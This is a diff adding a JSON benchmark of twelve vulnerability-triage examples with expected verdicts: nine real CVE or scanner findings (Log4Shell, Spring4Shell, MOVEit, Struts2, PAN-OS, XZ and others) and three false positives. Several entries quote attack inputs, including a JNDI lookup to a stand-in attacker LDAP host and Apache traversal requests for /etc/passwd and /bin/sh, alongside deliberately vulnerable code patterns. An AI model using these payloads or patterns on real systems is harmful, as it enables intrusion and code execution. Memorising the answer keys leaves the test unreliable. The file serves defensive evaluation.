@@ -1,0 +1,126 @@
+{
+  "source": "~/workspace/gmi-clouder/security-benchmark-push/index.html, EXAMPLES and EXAMPLE_META, extracted 2026-11-10; expected verdicts from live-triage-examples.md (1-9 real, 10-12 false positive)",
+  "examples": [
+    {
+      "id": "log4shell",
+      "n": 1,
+      "title": "Log4Shell, CVE-2021-44228, Log4j JNDI RCE",
+      "expected_verdict": "real",
+      "expected": "REAL - critical. CVE-2021-44228, Log4j 2.0-beta9 to 2.14.1, CVSS 10.0, disclosed 10 Dec 2021. Fix: upgrade to Log4j 2.17.1 or later.",
+      "check": null,
+      "finding": "CVE-2021-44228 (Log4Shell), CVSS 10.0, Apache Log4j 2, versions 2.0-beta9 to 2.14.1, disclosed 10 Dec 2021.\nCode in a Java login handler, Log4j 2.14.1:\n\nString username = request.getParameter(\"username\");\nlogger.info(username);\n\nusername comes straight from the login form, no validation. Log4j expands ${...} lookups inside the logged message, including a JNDI lookup. An attacker sends username ${jndi:ldap://attacker-controlled-ldap-server/a} and the server performs the lookup, loads a remote Java class and runs it. Fix: upgrade Log4j to 2.17.1 or later, or set log4j2.formatMsgNoLookups=true.",
+      "code": "CVE-2021-44228 (Log4Shell), CVSS 10.0, Apache Log4j 2, versions 2.0-beta9 to 2.14.1, disclosed 10 Dec 2021.\nCode in a Java login handler, Log4j 2.14.1:\n\nString username = request.getParameter(\"username\");\nlogger.info(username);\n\nusername comes straight from the login form, no validation. Log4j expands ${...} lookups inside the logged message, including a JNDI lookup. An attacker sends username ${jndi:ldap://attacker-controlled-ldap-server/a} and the server performs the lookup, loads a remote Java class and runs it. Fix: upgrade Log4j to 2.17.1 or later, or set log4j2.formatMsgNoLookups=true."
+    },
+    {
+      "id": "fabjwt",
+      "n": 2,
+      "title": "FAB Azure JWT, CVE-2026-59243, auth bypass",
+      "expected_verdict": "real",
+      "expected": "REAL - critical. CVE-2026-59243, Flask-AppBuilder / apache-airflow-providers-fab before 3.7.3, published 29 Jul 2026. Fix: upgrade to 3.7.3, verify_signature defaults to True.",
+      "check": "Authentication and session flaws",
+      "finding": "CVE-2026-59243, Flask-AppBuilder / apache-airflow-providers-fab before 3.7.3, published 29 Jul 2026. CWE-347.\nCode in flask_appbuilder/security/manager.py, _decode_and_validate_azure_jwt:\n\nverify_signature = self.oauth_remotes[\"azure\"].client_kwargs.get(\"verify_signature\", False)\nif verify_signature:\n    keyset = JsonWebKey.import_key_set(self._get_microsoft_jwks())\n    claims = authlib_jwt.decode(id_token, keyset)\n    claims.validate()\n    return claims\nreturn jwt.decode(id_token, options={\"verify_signature\": False})\n\nThe Azure AD OAuth path decodes the ID token with verify_signature=False by default, so a forged or unsigned (alg:none) ID token presented to the OAuth callback authenticates as any user, including Admin. The Authentik path already defaulted to True. Fix: upgrade apache-airflow-providers-fab to 3.7.3, where verify_signature defaults to True.",
+      "code": "CVE-2026-59243, Flask-AppBuilder / apache-airflow-providers-fab before 3.7.3, published 29 Jul 2026. CWE-347.\nCode in flask_appbuilder/security/manager.py, _decode_and_validate_azure_jwt:\n\nverify_signature = self.oauth_remotes[\"azure\"].client_kwargs.get(\"verify_signature\", False)\nif verify_signature:\n    keyset = JsonWebKey.import_key_set(self._get_microsoft_jwks())\n    claims = authlib_jwt.decode(id_token, keyset)\n    claims.validate()\n    return claims\nreturn jwt.decode(id_token, options={\"verify_signature\": False})\n\nThe Azure AD OAuth path decodes the ID token with verify_signature=False by default, so a forged or unsigned (alg:none) ID token presented to the OAuth callback authenticates as any user, including Admin. The Authentik path already defaulted to True. Fix: upgrade apache-airflow-providers-fab to 3.7.3, where verify_signature defaults to True."
+    },
+    {
+      "id": "spring",
+      "n": 3,
+      "title": "Spring4Shell, CVE-2022-22965, RCE",
+      "expected_verdict": "real",
+      "expected": "REAL - critical, only under the stated conditions. CVE-2022-22965, Spring Framework 5.3.0-5.3.17 / 5.2.0-5.2.19, JDK 9+, WAR on Tomcat, CVSS 9.8, disclosed 31 Mar 2022. Fix: upgrade to 5.3.18 / 5.2.20.",
+      "check": null,
+      "finding": "CVE-2022-22965 (Spring4Shell), CVSS 9.8, Spring Framework 5.3.0-5.3.17 and 5.2.0-5.2.19, disclosed 31 Mar 2022.\nConditions for the known exploit path: Spring MVC or WebFlux, JDK 9 or higher, deployed as a WAR on Apache Tomcat. Spring Boot executable JARs are not affected by that path.\nAn attacker sends crafted HTTP parameters using data binding, for example class.module.classLoader.resources.context.parent.pipeline.first.pattern, to reach the Tomcat log handler, redirect the access log to a JSP file in the web root, and write a web shell. Fix: upgrade Spring Framework to 5.3.18 or 5.2.20, or Spring Boot to 2.6.6 or 2.5.12.",
+      "code": "CVE-2022-22965 (Spring4Shell), CVSS 9.8, Spring Framework 5.3.0-5.3.17 and 5.2.0-5.2.19, disclosed 31 Mar 2022.\nConditions for the known exploit path: Spring MVC or WebFlux, JDK 9 or higher, deployed as a WAR on Apache Tomcat. Spring Boot executable JARs are not affected by that path.\nAn attacker sends crafted HTTP parameters using data binding, for example class.module.classLoader.resources.context.parent.pipeline.first.pattern, to reach the Tomcat log handler, redirect the access log to a JSP file in the web root, and write a web shell. Fix: upgrade Spring Framework to 5.3.18 or 5.2.20, or Spring Boot to 2.6.6 or 2.5.12."
+    },
+    {
+      "id": "moveit",
+      "n": 4,
+      "title": "MOVEit SQL injection, CVE-2023-34362",
+      "expected_verdict": "real",
+      "expected": "REAL - critical. CVE-2023-34362, Progress MOVEit Transfer, CVSS 9.8, exploited May 2023 by Clop, 2,773 organisations. Fix: patch to 2021.0.6 / 2021.1.4 / 2022.0.4 / 2022.1.5 / 2023.0.1 or later.",
+      "check": "SQL injection",
+      "finding": "CVE-2023-34362, Progress MOVEit Transfer, CVSS 9.8, CISA KEV 2 Jun 2023. Mass-exploited from 27 May 2023 by the Clop group, about 2,773 organisations and 95 million people affected.\nFinding: unauthenticated SQL injection in the MOVEit Transfer web application. An attacker sends crafted web requests, the injection pulls an administrator-level token from the database, then the application's own file-write feature is used to drop the LEMURLOOT web shell human2.aspx and steal stored files.\nRepresentative vulnerable pattern, not MOVEit's proprietary source:\n\nquery = \"SELECT token FROM sessions WHERE user = '\" + username + \"'\"\ncursor.execute(query)\n\nFix: patch MOVEit Transfer to 2021.0.6, 2021.1.4, 2022.0.4, 2022.1.5 or 2023.0.1 or later, and use parameterised queries.",
+      "code": "CVE-2023-34362, Progress MOVEit Transfer, CVSS 9.8, CISA KEV 2 Jun 2023. Mass-exploited from 27 May 2023 by the Clop group, about 2,773 organisations and 95 million people affected.\nFinding: unauthenticated SQL injection in the MOVEit Transfer web application. An attacker sends crafted web requests, the injection pulls an administrator-level token from the database, then the application's own file-write feature is used to drop the LEMURLOOT web shell human2.aspx and steal stored files.\nRepresentative vulnerable pattern, not MOVEit's proprietary source:\n\nquery = \"SELECT token FROM sessions WHERE user = '\" + username + \"'\"\ncursor.execute(query)\n\nFix: patch MOVEit Transfer to 2021.0.6, 2021.1.4, 2022.0.4, 2022.1.5 or 2023.0.1 or later, and use parameterised queries."
+    },
+    {
+      "id": "apachepath",
+      "n": 5,
+      "title": "Apache path traversal, CVE-2021-41773",
+      "expected_verdict": "real",
+      "expected": "REAL - high, critical with CGI. CVE-2021-41773, Apache HTTP Server 2.4.49, CISA KEV, fix 2.4.51 (2.4.50 fix was incomplete, CVE-2021-42013).",
+      "check": "Path traversal",
+      "finding": "CVE-2021-41773, Apache HTTP Server 2.4.49, CISA Known Exploited Vulnerabilities, published 4 Oct 2021.\nA change to ap_normalize_path() in 2.4.49 let URL-encoded dot segments slip past the traversal check. A request such as GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd maps to files outside the configured Alias directory. If CGI is enabled, POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh runs commands as remote code execution.\nFix: upgrade Apache HTTP Server to 2.4.51 or later. The 2.4.50 fix was incomplete, see CVE-2021-42013.",
+      "code": "CVE-2021-41773, Apache HTTP Server 2.4.49, CISA Known Exploited Vulnerabilities, published 4 Oct 2021.\nA change to ap_normalize_path() in 2.4.49 let URL-encoded dot segments slip past the traversal check. A request such as GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd maps to files outside the configured Alias directory. If CGI is enabled, POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh runs commands as remote code execution.\nFix: upgrade Apache HTTP Server to 2.4.51 or later. The 2.4.50 fix was incomplete, see CVE-2021-42013."
+    },
+    {
+      "id": "struts",
+      "n": 6,
+      "title": "Struts2 OGNL, CVE-2017-5638, Equifax",
+      "expected_verdict": "real",
+      "expected": "REAL - critical. CVE-2017-5638, Apache Struts2 2.3.5-2.3.31 / 2.5-2.5.10, CVSS 10.0, S2-045, Mar 2017, Equifax breach, 147 million people. Fix: 2.3.32 / 2.5.10.1.",
+      "check": null,
+      "finding": "CVE-2017-5638, Apache Struts2, CVSS 10.0, advisory S2-045, Mar 2017. Used in the Equifax breach, about 147 million people affected.\nThe Jakarta Multipart parser puts a raw Content-Type header value into an error message that is then evaluated as an OGNL expression. An unauthenticated attacker sends a crafted Content-Type header containing %{...} OGNL, Struts2 evaluates it, and the attacker runs an arbitrary OS command, for example via ProcessBuilder, with output returned in the response.\nAffected: Struts 2.3.5-2.3.31 and 2.5-2.5.10. Fix: upgrade to 2.3.32 or 2.5.10.1.",
+      "code": "CVE-2017-5638, Apache Struts2, CVSS 10.0, advisory S2-045, Mar 2017. Used in the Equifax breach, about 147 million people affected.\nThe Jakarta Multipart parser puts a raw Content-Type header value into an error message that is then evaluated as an OGNL expression. An unauthenticated attacker sends a crafted Content-Type header containing %{...} OGNL, Struts2 evaluates it, and the attacker runs an arbitrary OS command, for example via ProcessBuilder, with output returned in the response.\nAffected: Struts 2.3.5-2.3.31 and 2.5-2.5.10. Fix: upgrade to 2.3.32 or 2.5.10.1."
+    },
+    {
+      "id": "panos",
+      "n": 7,
+      "title": "PAN-OS command injection, CVE-2024-3400",
+      "expected_verdict": "real",
+      "expected": "REAL - critical. CVE-2024-3400, Palo Alto PAN-OS 10.2 / 11.0 / 11.1 GlobalProtect, CVSS 10.0, Apr 2024, Operation MidnightEclipse, CISA KEV. Fix: 10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3.",
+      "check": null,
+      "finding": "CVE-2024-3400, Palo Alto Networks PAN-OS GlobalProtect, CVSS 10.0, published 12 Apr 2024, CISA KEV the same day, exploited in Operation MidnightEclipse.\nAn unauthenticated attacker sends a crafted request to the GlobalProtect gateway or portal that creates an arbitrary file, which is then used to execute commands with root privileges on the firewall. Affected: PAN-OS 10.2.0-10.2.9, 11.0.0-11.0.4, 11.1.0-11.1.2 with GlobalProtect enabled. Cloud NGFW, Panorama and Prisma Access are not affected.\nRepresentative vulnerable pattern, not Palo Alto's proprietary code:\n\nos.system(\"telemetry-upload \" + request.args[\"device\"])\n\nFix: apply hotfix 10.2.9-h1, 11.0.4-h1 or 11.1.2-h3 or later.",
+      "code": "CVE-2024-3400, Palo Alto Networks PAN-OS GlobalProtect, CVSS 10.0, published 12 Apr 2024, CISA KEV the same day, exploited in Operation MidnightEclipse.\nAn unauthenticated attacker sends a crafted request to the GlobalProtect gateway or portal that creates an arbitrary file, which is then used to execute commands with root privileges on the firewall. Affected: PAN-OS 10.2.0-10.2.9, 11.0.0-11.0.4, 11.1.0-11.1.2 with GlobalProtect enabled. Cloud NGFW, Panorama and Prisma Access are not affected.\nRepresentative vulnerable pattern, not Palo Alto's proprietary code:\n\nos.system(\"telemetry-upload \" + request.args[\"device\"])\n\nFix: apply hotfix 10.2.9-h1, 11.0.4-h1 or 11.1.2-h3 or later."
+    },
+    {
+      "id": "xz",
+      "n": 8,
+      "title": "XZ supply chain, CVE-2024-3094, OSV finding",
+      "expected_verdict": "real",
+      "expected": "REAL - critical. CVE-2024-3094, XZ Utils 5.6.0 / 5.6.1, CVSS 10.0, disclosed 29 Mar 2024 by Andres Freund. Fix: downgrade to 5.4.6 or upgrade to 5.6.2.",
+      "check": null,
+      "finding": "OSV-scanner finding: liblzma / XZ Utils 5.6.0 and 5.6.1, CVE-2024-3094, CVSS 10.0, disclosed 29 Mar 2024.\nA malicious co-maintainer, Jia Tan, hid a backdoor in the release tarballs, in a modified m4/build-to-host.m4 build macro and obfuscated test files, not in the Git repository. On systems where sshd links libsystemd, which links liblzma, the backdoor hooks RSA_public_decrypt during SSH public-key authentication, so a client with a specific Ed448 private key gets pre-authentication remote code execution. Microsoft engineer Andres Freund found it from about 500ms of extra sshd latency.\nFix: downgrade XZ Utils to an uncompromised version such as 5.4.6, or upgrade to 5.6.2.",
+      "code": "OSV-scanner finding: liblzma / XZ Utils 5.6.0 and 5.6.1, CVE-2024-3094, CVSS 10.0, disclosed 29 Mar 2024.\nA malicious co-maintainer, Jia Tan, hid a backdoor in the release tarballs, in a modified m4/build-to-host.m4 build macro and obfuscated test files, not in the Git repository. On systems where sshd links libsystemd, which links liblzma, the backdoor hooks RSA_public_decrypt during SSH public-key authentication, so a client with a specific Ed448 private key gets pre-authentication remote code execution. Microsoft engineer Andres Freund found it from about 500ms of extra sshd latency.\nFix: downgrade XZ Utils to an uncompromised version such as 5.4.6, or upgrade to 5.6.2."
+    },
+    {
+      "id": "pickle",
+      "n": 9,
+      "title": "Pickle deserialization RCE, CWE-502",
+      "expected_verdict": "real",
+      "expected": "REAL - critical. Insecure deserialization, CWE-502, dataset finding S14. Fix: use json.loads, or signed / allowlisted data only.",
+      "check": null,
+      "finding": "Semgrep finding, dataset S14, insecure deserialization, CWE-502.\nCode in app.py:\n\nimport pickle\nobj = pickle.loads(request.data)\n\nrequest.data is untrusted, attacker-controlled bytes. Unpickling it can construct arbitrary Python objects and execute arbitrary code during deserialization. This is the same class as the Jackson-databind and Java deserialization flaws that have produced real CVEs. Fix: do not unpickle untrusted data. Use json.loads for plain data, or verify a signature and an allowlist before deserializing.",
+      "code": "Semgrep finding, dataset S14, insecure deserialization, CWE-502.\nCode in app.py:\n\nimport pickle\nobj = pickle.loads(request.data)\n\nrequest.data is untrusted, attacker-controlled bytes. Unpickling it can construct arbitrary Python objects and execute arbitrary code during deserialization. This is the same class as the Jackson-databind and Java deserialization flaws that have produced real CVEs. Fix: do not unpickle untrusted data. Use json.loads for plain data, or verify a signature and an allowlist before deserializing."
+    },
+    {
+      "id": "ssrffp",
+      "n": 10,
+      "title": "False positive, SSRF allowlisted host",
+      "expected_verdict": "false_positive",
+      "expected": "FALSE POSITIVE - low. Dataset finding F05. A fixed URL is not user-controlled, so there is no SSRF.",
+      "check": "Server-side request forgery (SSRF)",
+      "finding": "Semgrep flagged: possible SSRF, server-side request.\nCode in status.py:\n\nresp = requests.get(\"https://api.gmicloud.ai/v1/models\", timeout=5)\n\nThe URL is a fixed constant, not user-controlled, and it is GMI Cloud's own API host. There is no attacker-controlled URL reaching an internal service or cloud metadata endpoint. Fix: none needed, this is a false positive. Mark it as such and do not change the code.",
+      "code": "Semgrep flagged: possible SSRF, server-side request.\nCode in status.py:\n\nresp = requests.get(\"https://api.gmicloud.ai/v1/models\", timeout=5)\n\nThe URL is a fixed constant, not user-controlled, and it is GMI Cloud's own API host. There is no attacker-controlled URL reaching an internal service or cloud metadata endpoint. Fix: none needed, this is a false positive. Mark it as such and do not change the code."
+    },
+    {
+      "id": "xssfp",
+      "n": 11,
+      "title": "False positive, XSS via textContent",
+      "expected_verdict": "false_positive",
+      "expected": "FALSE POSITIVE - low. Dataset finding F04. textContent does not parse HTML, so there is no XSS.",
+      "check": "Cross-site scripting (XSS)",
+      "finding": "Semgrep flagged: possible DOM XSS.\nCode in profile.js:\n\nel.textContent = userName\n\nuserName comes from the user, but it is assigned to textContent, not innerHTML. textContent treats the value as plain text and does not parse it as HTML or JavaScript, so no script can execute. Fix: none needed, this is a false positive. If the code used el.innerHTML = userName, that would be real DOM XSS.",
+      "code": "Semgrep flagged: possible DOM XSS.\nCode in profile.js:\n\nel.textContent = userName\n\nuserName comes from the user, but it is assigned to textContent, not innerHTML. textContent treats the value as plain text and does not parse it as HTML or JavaScript, so no script can execute. Fix: none needed, this is a false positive. If the code used el.innerHTML = userName, that would be real DOM XSS."
+    },
+    {
+      "id": "sqlifp",
+      "n": 12,
+      "title": "False positive, parameterised SQL",
+      "expected_verdict": "false_positive",
+      "expected": "FALSE POSITIVE - low. Dataset finding F01. Parameters are bound safely, so there is no SQL injection.",
+      "check": "SQL injection",
+      "finding": "Semgrep flagged: possible SQL injection, string formatting in query.\nCode in reports/queries.py:\n\ndef orders_for_user(db, user_id):\n    # user_id comes from the session, and the value is bound as a parameter\n    return db.execute(\n        \"SELECT * FROM orders WHERE user_id = ?\",\n        (user_id,),\n    ).fetchall()\n\nThe query uses a placeholder and the value is bound as a parameter by the database driver, so user input cannot break out of the query and inject SQL. Fix: none needed, this is a false positive.",
+      "code": "Semgrep flagged: possible SQL injection, string formatting in query.\nCode in reports/queries.py:\n\ndef orders_for_user(db, user_id):\n    # user_id comes from the session, and the value is bound as a parameter\n    return db.execute(\n        \"SELECT * FROM orders WHERE user_id = ?\",\n        (user_id,),\n    ).fetchall()\n\nThe query uses a placeholder and the value is bound as a parameter by the database driver, so user input cannot break out of the query and inject SQL. Fix: none needed, this is a false positive."
+    }
+  ],
+  "check_note": "check is set only when the example maps cleanly onto one of the 7 known checks from the audit tool; otherwise null, so no finding is forced into a check it is not."
+}
